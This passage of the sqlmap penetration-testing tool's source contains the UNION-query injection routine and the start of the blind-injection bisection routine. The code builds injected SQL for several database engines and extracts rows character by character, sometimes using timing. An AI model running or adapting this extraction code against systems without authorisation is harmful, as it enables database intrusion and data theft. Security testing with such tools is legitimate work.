kb.chars.stop[:-1] in (page or \"\"):\n                warnMsg = \"automatically patching output having last char trimmed\"\n                singleTimeWarnMessage(warnMsg)\n                page = page.replace(kb.chars.stop[:-1], kb.chars.stop)\n\n            retVal = _(\"(?P<result>%s.*%s)\" % (kb.chars.start, kb.chars.stop))\n\n        if retVal is not None:\n            retVal = getUnicode(retVal, kb.pageEncoding)\n\n            # Special case when DBMS is Microsoft SQL Server and error message is used as a result of UNION injection\n            if Backend.isDbms(DBMS.MSSQL) and wasLastResponseDBMSError():\n                retVal = htmlUnescape(retVal).replace(\"<br>\", \"\\n\")\n\n            hashDBWrite(\"%s%s\" % (conf.hexConvert or False, expression), retVal)\n\n        elif not kb.jsonAggMode:\n            trimmed = _(\"%s(?P<result>.*?)<\" % (kb.chars.start))\n\n            if trimmed:\n                warnMsg = \"possible server trimmed output detected \"\n                warnMsg += \"(probably due to its length and/or content): \"\n                warnMsg += safecharencode(trimmed)\n                logger.warning(warnMsg)\n\n            elif re.search(r\"ORDER BY [^ ]+\\Z\", expression):\n                debugMsg = \"retrying failed SQL query without the ORDER BY clause\"\n                singleTimeDebugMessage(debugMsg)\n\n                expression = re.sub(r\"\\s*ORDER BY [^ ]+\\Z\", \"\", expression)\n                retVal = _oneShotUnionUse(expression, unpack, limited)\n\n            elif kb.nchar and re.search(r\" AS N(CHAR|VARCHAR)\", agent.nullAndCastField(expression)):\n                debugMsg = \"turning off NATIONAL CHARACTER casting\"  # NOTE: in some cases there are \"known\" incompatibilities between original columns and NCHAR (e.g. http://testphp.vulnweb.com/artists.php?artist=1)\n                singleTimeDebugMessage(debugMsg)\n\n                kb.nchar = False\n                retVal = _oneShotUnionUse(expression, unpack, limited)\n    else:\n        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector\n        kb.unionDuplicates = vector[7]\n\n    return retVal\n\ndef configUnion(char=None, columns=None):\n    def _configUnionChar(char):\n        if not isinstance(char, six.string_types):\n            return\n\n        kb.uChar = char\n\n        if conf.uChar is not None:\n            kb.uChar = char.replace(\"[CHAR]\", conf.uChar if isDigit(conf.uChar) else \"'%s'\" % conf.uChar.strip(\"'\"))\n\n    def _configUnionCols(columns):\n        if not isinstance(columns, six.string_types):\n            return\n\n        columns = columns.replace(' ', \"\")\n        if '-' in columns:\n            colsStart, colsStop = columns.split('-')\n        else:\n            colsStart, colsStop = columns, columns\n\n        if not isDigit(colsStart) or not isDigit(colsStop):\n            raise SqlmapSyntaxException(\"--union-cols must be a range of integers\")\n\n        conf.uColsStart, conf.uColsStop = int(colsStart), int(colsStop)\n\n        if conf.uColsStart > conf.uColsStop:\n            errMsg = \"--union-cols range has to represent lower to \"\n            errMsg += \"higher number of columns\"\n            raise SqlmapSyntaxException(errMsg)\n\n    _configUnionChar(char)\n    _configUnionCols(conf.uCols or columns)\n\ndef unionUse(expression, unpack=True, dump=False):\n    \"\"\"\n    This function tests for an UNION SQL injection on the target\n    URL then call its subsidiary function to effectively perform an\n    UNION SQL injection on the affected URL\n    \"\"\"\n\n    initTechnique(PAYLOAD.TECHNIQUE.UNION)\n\n    abortedFlag = False\n    count = None\n    origExpr = expression\n    startLimit = 0\n    stopLimit = None\n    value = None\n\n    width = getConsoleWidth()\n    start = time.time()\n\n    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)\n\n    # Set kb.partRun in case the engine is called from the API\n    kb.partRun = getPartRun(alias=False) if conf.api else None\n\n    if expressionFieldsList and len(expressionFieldsList) > 1 and \"ORDER BY\" in expression.upper():\n        # Removed ORDER BY clause because UNION does not play well with it\n        expression = re.sub(r\"(?i)\\s*ORDER BY\\s+[\\w,]+\", \"\", expression)\n        debugMsg = \"stripping ORDER BY clause from statement because \"\n        debugMsg += \"it does not play well with UNION query SQL injection\"\n        singleTimeDebugMessage(debugMsg)\n\n    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE) and expressionFields and not any((conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):\n        match = re.search(r\"SELECT\\s*(.+?)\\bFROM\", expression, re.I)\n        if match and not (Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression) and not re.search(r\"\\b(MIN|MAX|COUNT)\\(\", expression):\n            kb.jsonAggMode = True\n            if Backend.isDbms(DBMS.MYSQL):\n                query = expression.replace(expressionFields, \"CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')\" % (kb.chars.start, kb.chars.delimiter, expressionFields, kb.chars.stop), 1)\n            elif Backend.isDbms(DBMS.ORACLE):\n                query = expression.replace(expressionFields, \"'%s'||JSON_ARRAYAGG(%s)||'%s'\" % (kb.chars.start, (\"||'%s'||\" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)\n            elif Backend.isDbms(DBMS.SQLITE):\n                query = expression.replace(expressionFields, \"'%s'||JSON_GROUP_ARRAY(%s)||'%s'\" % (kb.chars.start, (\"||'%s'||\" % kb.chars.delimiter).join(\"COALESCE(%s,' ')\" % field for field in expressionFieldsList), kb.chars.stop), 1)\n            elif Backend.isDbms(DBMS.PGSQL):    # Note: ARRAY_AGG does CSV alike output, thus enclosing start/end inside each item\n                query = expression.replace(expressionFields, \"ARRAY_AGG('%s'||%s||'%s')::text\" % (kb.chars.start, (\"||'%s'||\" % kb.chars.delimiter).join(\"COALESCE(%s::text,' ')\" % field for field in expressionFieldsList), kb.chars.stop), 1)\n            elif Backend.isDbms(DBMS.MSSQL):\n                query = \"'%s'+(%s FOR JSON AUTO, INCLUDE_NULL_VALUES)+'%s'\" % (kb.chars.start, expression, kb.chars.stop)\n            output = _oneShotUnionUse(query, False)\n            value = parseUnionPage(output)\n            kb.jsonAggMode = False\n\n    # We have to check if the SQL query might return multiple entries\n    # if the technique is partial UNION query and in such case forge the\n    # SQL limiting the query output one entry at a time\n    # NOTE: we assume that only queries that get data from a table can\n    # return multiple entries\n    if value is None and (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or kb.forcePartialUnion or conf.forcePartial or (dump and (conf.limitStart or conf.limitStop)) or \"LIMIT \" in expression.upper()) and \" FROM \" in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):\n        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)\n\n        if limitCond:\n            # Count the number of SQL query entries output\n            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)\n\n            if \" ORDER BY \" in countedExpression.upper():\n                _ = countedExpression.upper().rindex(\" ORDER BY \")\n                countedExpression = countedExpression[:_]\n\n            output = _oneShotUnionUse(countedExpression, unpack)\n            count = unArrayizeValue(parseUnionPage(output))\n\n            if isNumPosStrValue(count):\n                if isinstance(stopLimit, int) and stopLimit > 0:\n                    stopLimit = min(int(count), int(stopLimit))\n                else:\n                    stopLimit = int(count)\n\n                    debugMsg = \"used SQL query returns \"\n                    debugMsg += \"%d %s\" % (stopLimit, \"entries\" if stopLimit > 1 else \"entry\")\n                    logger.debug(debugMsg)\n\n            elif count and (not isinstance(count, six.string_types) or not count.isdigit()):\n                warnMsg = \"it was not possible to count the number \"\n                warnMsg += \"of entries for the SQL query provided. \"\n                warnMsg += \"sqlmap will assume that it returns only \"\n                warnMsg += \"one entry\"\n                logger.warning(warnMsg)\n\n                stopLimit = 1\n\n            elif not isNumPosStrValue(count):\n                if not count:\n                    warnMsg = \"the SQL query provided does not \"\n                    warnMsg += \"return any output\"\n                    logger.warning(warnMsg)\n                else:\n                    value = []  # for empty tables\n                return value\n\n            if isNumPosStrValue(count) and int(count) > 1:\n                threadData = getCurrentThreadData()\n\n                try:\n                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))\n                except OverflowError:\n                    errMsg = \"boundary limits (%d,%d) are too large. Please rerun \" % (startLimit, stopLimit)\n                    errMsg += \"with switch '--fresh-queries'\"\n                    raise SqlmapDataException(errMsg)\n\n                numThreads = min(conf.threads, (stopLimit - startLimit))\n                threadData.shared.value = BigArray()\n                threadData.shared.buffered = []\n                threadData.shared.counter = 0\n                threadData.shared.lastFlushed = startLimit - 1\n                threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1\n\n                if threadData.shared.showEta:\n                    threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))\n\n                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:\n                    kb.suppressResumeInfo = True\n                    debugMsg = \"suppressing possible resume console info for \"\n                    debugMsg += \"large number of rows as it might take too long\"\n                    logger.debug(debugMsg)\n\n                try:\n                    def unionThread():\n                        threadData = getCurrentThreadData()\n\n                        while kb.threadContinue:\n                            with kb.locks.limit:\n                                try:\n                                    threadData.shared.counter += 1\n                                    num = next(threadData.shared.limits)\n                                except StopIteration:\n                                    break\n\n                            if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n                                field = expressionFieldsList[0]\n                            elif Backend.isDbms(DBMS.ORACLE):\n                                field = expressionFieldsList\n                            else:\n                                field = None\n\n                            limitedExpr = agent.limitQuery(num, expression, field)\n                            output = _oneShotUnionUse(limitedExpr, unpack, True)\n\n                            if not kb.threadContinue:\n                                break\n\n                            if output:\n                                with kb.locks.value:\n                                    if all(_ in output for _ in (kb.chars.start, kb.chars.stop)):\n                                        items = parseUnionPage(output)\n\n                                        if threadData.shared.showEta:\n                                            threadData.shared.progress.progress(threadData.shared.counter)\n                                        if isListLike(items):\n                                            # in case that we requested N columns and we get M!=N then we have to filter a bit\n                                            if len(items) > 1 and len(expressionFieldsList) > 1:\n                                                items = [item for item in items if isListLike(item) and len(item) == len(expressionFieldsList)]\n                                            items = [_ for _ in flattenValue(items)]\n                                            if len(items) > len(expressionFieldsList):\n                                                filtered = OrderedDict()\n                                                for item in items:\n                                                    key = re.sub(r\"[^A-Za-z0-9]\", \"\", item).lower()\n                                                    if key not in filtered or re.search(r\"[^A-Za-z0-9]\", item):\n                                                        filtered[key] = item\n                                                items = list(six.itervalues(filtered))\n                                            items = [items]\n                                        index = None\n                                        for index in xrange(1 + len(threadData.shared.buffered)):\n                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:\n                                                break\n                                        threadData.shared.buffered.insert(index or 0, (num, items))\n                                    else:\n                                        index = None\n                                        if threadData.shared.showEta:\n                                            threadData.shared.progress.progress(threadData.shared.counter)\n                                        for index in xrange(1 + len(threadData.shared.buffered)):\n                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:\n                                                break\n                                        threadData.shared.buffered.insert(index or 0, (num, None))\n\n                                        items = output.replace(kb.chars.start, \"\").replace(kb.chars.stop, \"\").split(kb.chars.delimiter)\n\n                                    while threadData.shared.buffered and (threadData.shared.lastFlushed + 1 >= threadData.shared.buffered[0][0] or len(threadData.shared.buffered) > MAX_BUFFERED_PARTIAL_UNION_LENGTH):\n                                        threadData.shared.lastFlushed, _ = threadData.shared.buffered[0]\n                                        if not isNoneValue(_):\n                                            threadData.shared.value.extend(arrayizeValue(_))\n                                        del threadData.shared.buffered[0]\n\n                                if conf.verbose == 1 and not (threadData.resumed and kb.suppressResumeInfo) and not threadData.shared.showEta and not kb.bruteMode:\n                                    _ = ','.join(\"'%s'\" % _ for _ in (flattenValue(arrayizeValue(items)) if not isinstance(items, six.string_types) else [items]))\n                                    status = \"[%s] [INFO] %s: %s\" % (time.strftime(\"%X\"), \"resumed\" if threadData.resumed else \"retrieved\", _ if kb.safeCharEncode else safecharencode(_))\n\n                                    if len(status) > width:\n                                        status = \"%s...\" % status[:width - 3]\n\n                                    dataToStdout(\"%s\\n\" % status)\n\n                    runThreads(numThreads, unionThread)\n\n                    if conf.verbose == 1:\n                        clearConsoleLine(True)\n\n                except KeyboardInterrupt:\n                    abortedFlag = True\n\n                    warnMsg = \"user aborted during enumeration. sqlmap \"\n                    warnMsg += \"will display partial output\"\n                    logger.warning(warnMsg)\n\n                finally:\n                    for _ in sorted(threadData.shared.buffered):\n                        if not isNoneValue(_[1]):\n                            threadData.shared.value.extend(arrayizeValue(_[1]))\n                    value = threadData.shared.value\n                    kb.suppressResumeInfo = False\n\n    if not value and not abortedFlag:\n        output = _oneShotUnionUse(expression, unpack)\n        value = parseUnionPage(output)\n\n    duration = calculateDeltaSeconds(start)\n\n    if not kb.bruteMode:\n        debugMsg = \"performed %d quer%s in %.2f seconds\" % (kb.counters[PAYLOAD.TECHNIQUE.UNION], 'y' if kb.counters[PAYLOAD.TECHNIQUE.UNION] == 1 else \"ies\", duration)\n        logger.debug(debugMsg)\n\n    return value\n", "lib/techniques/union/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/techniques/blind/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/techniques/blind/inference.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import decodeDbmsHexValue\nfrom lib.core.common import decodeIntToUnicode\nfrom lib.core.common import filterControlChars\nfrom lib.core.common import getCharset\nfrom lib.core.common import getCounter\nfrom lib.core.common import getPartRun\nfrom lib.core.common import getTechnique\nfrom lib.core.common import getTechniqueData\nfrom lib.core.common import goGoodSamaritan\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import incrementCounter\nfrom lib.core.common import isDigit\nfrom lib.core.common import isListLike\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import ADJUST_TIME_DELAY\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapThreadException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.settings import CHAR_INFERENCE_MARK\nfrom lib.core.settings import INFERENCE_BLANK_BREAK\nfrom lib.core.settings import INFERENCE_EQUALS_CHAR\nfrom lib.core.settings import INFERENCE_GREATER_CHAR\nfrom lib.core.settings import INFERENCE_MARKER\nfrom lib.core.settings import INFERENCE_NOT_EQUALS_CHAR\nfrom lib.core.settings import INFERENCE_UNKNOWN_CHAR\nfrom lib.core.settings import MAX_BISECTION_LENGTH\nfrom lib.core.settings import MAX_REVALIDATION_STEPS\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PARTIAL_HEX_VALUE_MARKER\nfrom lib.core.settings import PARTIAL_VALUE_MARKER\nfrom lib.core.settings import PAYLOAD_DELIMITER\nfrom lib.core.settings import RANDOM_INTEGER_MARKER\nfrom lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import runThreads\nfrom lib.core.unescaper import unescaper\nfrom lib.request.connect import Connect as Request\nfrom lib.utils.progress import ProgressBar\nfrom lib.utils.safe2bin import safecharencode\nfrom lib.utils.xrange import xrange\nfrom thirdparty import six\n\ndef bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):\n    \"\"\"\n    Bisection algorithm that can be used to perform blind SQL injection\n    on an affected host\n    \"\"\"\n\n    abortedFlag = False\n    showEta = False\n    partialValue = u\"\"\n    finalValue = None\n    retrievedLength = 0\n\n    if payload is None:\n        return 0, None\n\n    if charsetType is None and conf.charset:\n        asciiTbl = sorted(set(ord(_) for _ in conf.charset))\n    else:\n        asciiTbl = getCharset(charsetType)\n\n    threadData = getCurrentThreadData()\n    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))\n    retVal = hashDBRetrieve(expression, checkConf=True)\n\n    if retVal:\n        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:\n            pass\n        elif PARTIAL_HEX_VALUE_MARKER in retVal:\n            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, \"\")\n\n            if retVal and conf.hexConvert:\n                partialValue = retVal\n                infoMsg = \"resuming partial value: %s\" % safecharencode(partialValue)\n                logger.info(infoMsg)\n        elif PARTIAL_VALUE_MARKER in retVal:\n            retVal = retVal.replace(PARTIAL_VALUE_MARKER, \"\")\n\n            if retVal and not conf.hexConvert:\n                partialValue = retVal\n                infoMsg = \"resuming partial value: %s\" % safecharencode(partialValue)\n                logger.info(infoMsg)\n        else:\n            infoMsg = \"resumed: %s\" % safecharencode(retVal)\n            logger.info(infoMsg)\n\n            return 0, retVal\n\n    if Backend.isDbms(DBMS.MCKOI):\n        match = re.search(r\"\\ASELECT\\b(.+)\\bFROM\\b(.+)\\Z\", expression, re.I)\n        if match:\n            original = queries[Backend.getIdentifiedDbms()].inference.query\n            right = original.split('<')[1]\n            payload = payload.replace(right, \"(SELECT %s FROM %s)\" % (right, match.group(2).strip()))\n            expression = match.group(1).strip()\n\n    elif Backend.isDbms(DBMS.FRONTBASE):\n        match = re.search(r\"\\ASELECT\\b(\\s+TOP\\s*\\([^)]+\\)\\s+)?(.+)\\bFROM\\b(.+)\\Z\", expression, re.I)\n        if match:\n            payload = payload.replace(INFERENCE_GREATER_CHAR, \" FROM %s)%s\" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))\n            payload = payload.replace(\"SUBSTRING\", \"(SELECT%sSUBSTRING\" % (match.group(1) if match.group(1) else \" \"), 1)\n            expression = match.group(2).strip()\n\n    try:\n        # Set kb.partRun in case \"common prediction\" feature (a.k.a. \"good samaritan\") is used or the engine is called from the API\n        if conf.predictOutput:\n            kb.partRun = getPartRun()\n        elif conf.api:\n            kb.partRun = getPartRun(alias=False)\n        else:\n            kb.partRun = None\n\n        if partialValue:\n            firstChar = len(partialValue)\n        elif re.search(r\"(?i)(\\b|CHAR_)(LENGTH|LEN|COUNT)\\(\", expression):\n            firstChar = 0\n        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, \"isdigit\") and conf.firstChar.isdigit())):\n            firstChar = int(conf.firstChar) - 1\n            if kb.fileReadMode:\n                firstChar <<= 1\n        elif hasattr(firstChar, \"isdigit\") and firstChar.isdigit() or isinstance(firstChar, int):\n            firstChar = int(firstChar) - 1\n        else:\n            firstChar = 0\n\n        if re.search(r\"(?i)(\\b|CHAR_)(LENGTH|LEN|COUNT)\\(\", expression):\n            lastChar = 0\n        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, \"isdigit\") and conf.lastChar.isdigit())):\n            lastChar = int(conf.lastChar)\n        elif hasattr(lastChar, \"isdigit\") and lastChar.isdigit() or isinstance(lastChar, int):\n            lastChar = int(lastChar)\n        else:\n            lastChar = 0\n\n        if Backend.getDbms():\n            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)\n            nulledCastedField = agent.nullAndCastField(fieldToCastStr)\n            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)\n            expressionUnescaped = unescaper.escape(expressionReplaced)\n        else:\n            expressionUnescaped = unescaper.escape(expression)\n\n        if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):\n            length = int(length)\n        else:\n            length = None\n\n        if length == 0:\n            return 0, \"\"\n\n        if length and (lastChar > 0 or firstChar > 0):\n            length = min(length, lastChar or length) - firstChar\n\n        if length and length > MAX_BISECTION_LENGTH:\n            length = None\n\n        showEta = conf.eta and isinstance(length, int)\n\n        if kb.bruteMode:\n            numThreads = 1\n        else:\n            numThreads = min(conf.threads or 0, length or 0) or 1\n\n        if showEta:\n            progress = ProgressBar(maxValue=length)\n\n        if numThreads > 1:\n            if not timeBasedCompare or kb.forceThreads:\n                debugMsg = \"starting %d thread%s\" % (numThreads, (\"s\" if numThreads > 1 else \"\"))\n                logger.debug(debugMsg)\n            else:\n                numThreads = 1\n\n        if conf.threads == 1 and not any((timeBasedCompare, conf.predictOutput)):\n            warnMsg = \"running in a single-thread mode. Please consider \"\n            warnMsg += \"usage of option '--threads' for faster data retrieval\"\n            singleTimeWarnMessage(warnMsg)\n\n        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):\n            if isinstance(length, int) and numThreads > 1:\n                dataToStdout(\"[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), \"_\" * min(length, conf.progressWidth)))\n                dataToStdout(\"\\r[%s] [INFO] retrieved: \" % time.strftime(\"%X\"))\n            else:\n                dataToStdout(\"\\r[%s] [INFO] retrieved: \" % time.strftime(\"%X\"))\n\n        def tryHint(idx):\n            with kb.locks.hint:\n                hintValue = kb.hintValue\n\n            if payload is not None and len(hintValue or \"\") > 0 and len(hintValue) >= idx:\n                if \"'%s'\" % CHAR_INFERENCE_MARK in payload:\n                    posValue = hintValue[idx - 1]\n                else:\n                    posValue = ord(hintValue[idx - 1])\n\n                markingValue = \"'%s'\" % CHAR_INFERENCE_MARK\n                unescapedCharValue = unescaper.escape(\"'%s'\" % decodeIntToUnicode(posValue))\n                forgedPayload = agent.extractPayload(payload) or \"\"\n                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue)).replace(markingValue, unescapedCharValue)\n                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)\n                incrementCounter(getTechnique())\n\n                if result:\n                    return hintValue[idx - 1]\n\n            with kb.locks.hint:\n                kb.hintValue = \"\"\n\n            return None\n\n        def validateChar(idx, value):\n            \"\"\"\n            Used in inference - in time-based SQLi if original and retrieved value are not equal there will be a deliberate delay\n            \"\"\"\n\n            validationPayload = re.sub(r\"(%s.*?)%s(.*?%s)\" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r\"\\g<1>%s\\g<2>\" % INFERENCE_NOT_EQUALS_CHAR, payload)\n\n            if \"'%s'\" % CHAR_INFERENCE_MARK not in payload:\n                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))\n            else:\n                # e.g.: ... > '%c' -> ... > ORD(..)\n                markingValue = \"'%s'\" % CHAR_INFERENCE_MARK\n                unescapedCharValue = unescaper.escape(\"'%s'\" % decodeIntToUnicode(value))\n                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)\n\n            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n\n            if result and timeBasedCompare and getTechniqueData().trueCode:\n                result = threadData.lastCode == getTechniqueData().trueCode\n                if not result:\n                    warnMsg = \"detected HTTP code '%s' in validation phase is differing from expected '%s'\" % (threadData.lastCode, getTechniqueData().trueCode)\n                    singleTimeWarnMessage(warnMsg)\n\n            incrementCounter(getTechnique())\n\n            return result\n\n        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):\n            \"\"\"\n            continuousOrder means that distance between each two neighbour's\n            numerical values is exactly 1\n            \"\"\"\n\n            result = tryHint(idx)\n\n            if result:\n                return result\n\n            if charTbl is None:\n                charTbl = type(asciiTbl)(asciiTbl)\n\n            originalTbl = type(charTbl)(charTbl)\n\n            if kb.disableShiftTable:\n                shiftTable = None\n            elif continuousOrder and shiftTable is None:\n                # Used for gradual expanding into unicode charspace\n                shiftTable = [2, 2, 3, 3, 3]\n\n            if \"'%s'\" % CHAR_INFERENCE_MARK in payload:\n                for char in ('\\n', '\\r'):\n                    if ord(char) in charTbl:\n                        charTbl.remove(ord(char))\n\n            if not charTbl:\n                return None\n\n            elif len(charTbl) == 1:\n                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))\n                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n                incrementCounter(getTechnique())\n\n                if result:\n                    return decodeIntToUnicode(charTbl[0])\n                else:\n                    return None\n\n            maxChar = maxValue = charTbl[-1]\n            minValue = charTbl[0]\n            firstCheck = False\n            lastCheck = False\n            unexpectedCode = False\n\n            if continuousOrder:\n                while len(charTbl) > 1:\n                    position = None\n\n                    if charsetType is None:\n                        if not firstCheck:\n                            try:\n                                try:\n                                    lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]\n                                except IndexError:\n                                    lastChar = None\n                                else:\n                                    if 'a' <= lastChar <= 'z':\n                                        position = charTbl.index(ord('a') - 1)  # 96\n                                    elif 'A' <= lastChar <= 'Z':\n                                        position = charTbl.index(ord('A') - 1)  # 64\n                                    elif '0' <= lastChar <= '9':\n                                        position = charTbl.index(ord('0') - 1)  # 47\n                            except ValueError:\n                                pass\n                            finally:\n                                firstCheck = True\n\n                        elif not lastCheck and numThreads == 1:  # not usable in multi-threading environment\n                            if charTbl[(len(charTbl) >> 1)] < ord(' '):\n                                try:\n                                    # favorize last char check if current value inclines toward 0\n                                    position = charTbl.index(1)\n                                except ValueError:\n                                    pass\n                                finally:\n                                    lastCheck = True\n\n                    if position is None:\n                        position = (len(charTbl) >> 1)\n\n                    posValue = charTbl[position]\n                    falsePayload = None\n\n                    if \"'%s'\" % CHAR_INFERENCE_MARK not in payload:\n                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))\n                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))\n                    else:\n                        # e.g.: ... > '%c' -> ... > ORD(..)\n                        markingValue = \"'%s'\" % CHAR_INFERENCE_MARK\n                        unescapedCharValue = unescaper.escape(\"'%s'\" % decodeIntToUnicode(posValue))\n                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)\n                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)\n\n                    if timeBasedCompare:\n                        if kb.responseTimeMode:\n                            kb.responseTimePayload = falsePayload\n                        else:\n                            kb.responseTimePayload = None\n\n                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n\n                    incrementCounter(getTechnique())\n\n                    if not timeBasedCompare and getTechniqueData() is not None:\n                        unexpectedCode |= threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)\n                        if unexpectedCode:\n                            if threadData.lastCode is not None:\n                                warnMsg = \"unexpected HTTP code '%s' detected.\" % threadData.lastCode\n                            else:\n                                warnMsg = \"unexpected response detected.\"\n\n                            warnMsg += \" Will use (extra) validation step in similar cases\"\n\n                            singleTimeWarnMessage(warnMsg)\n\n                    if result:\n                        minValue = posValue\n\n                        if not isinstance(charTbl, xrange):\n                            charTbl = charTbl[position:]\n                        else:\n                            # xrange() - extended virtual charset used for memory/space optimization\n                            charTbl = xrange(charTbl[position], charTbl[-1] + 1)\n                    else:\n                        maxValue = posValue\n\n                        if not isinstance(charTbl, xrange):\n                            charTbl = charTbl[:position]\n                        else:\n                            charTbl = xrange(charTbl[0], charTbl[position])\n\n                    if len(charTbl) == 1:\n                        if maxValue == 1:\n                            return None\n\n                        # Going beyond the original charset\n                        elif minValue == maxChar:\n                            # If the original charTbl was [0,..,127] new one\n                            # will be [128,..,(128 << 4) - 1] or from 128 to 2047\n                            # and instead of making a HUGE list with all the\n                            # elements we use a xrange, which is a virtual\n                            # list\n                            if expand and shiftTable:\n                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())\n                                originalTbl = xrange(charTbl)\n                                maxChar = maxValue = charTbl[-1]\n                                minValue = charTbl[0]\n                            else:\n                                kb.disableShiftTable = True\n                                return None\n                        else:\n                            retVal = minValue + 1\n\n                            if retVal in originalTbl or (retVal == ord('\\n') and CHAR_INFERENCE_MARK in payload):\n                                if (timeBasedCompare or unexpectedCode) and not validateChar(idx, retVal):\n                                    if not kb.originalTimeDelay:\n                                        kb.originalTimeDelay = conf.timeSec\n\n                                    threadData.validationRun = 0\n                                    if (retried or 0) < MAX_REVALIDATION_STEPS:\n                                        errMsg = \"invalid character detected. retrying..\"\n                                        logger.error(errMsg)\n\n                                        if timeBasedCompare:\n                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:\n                                                conf.timeSec += 1\n                                                warnMsg = \"increasing time delay to %d second%s\" % (conf.timeSec, 's' if conf.timeSec > 1 else '')\n                                                logger.warning(warnMsg)\n\n                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:\n                                                dbgMsg = \"turning off time auto-adjustment mechanism\"\n                                                logger.debug(dbgMsg)\n                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO\n\n                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)\n                                    else:\n                                        errMsg = \"unable to properly validate last character value ('%s')..\" % decodeIntToUnicode(retVal)\n                                        logger.error(errMsg)\n                                        conf.timeSec = 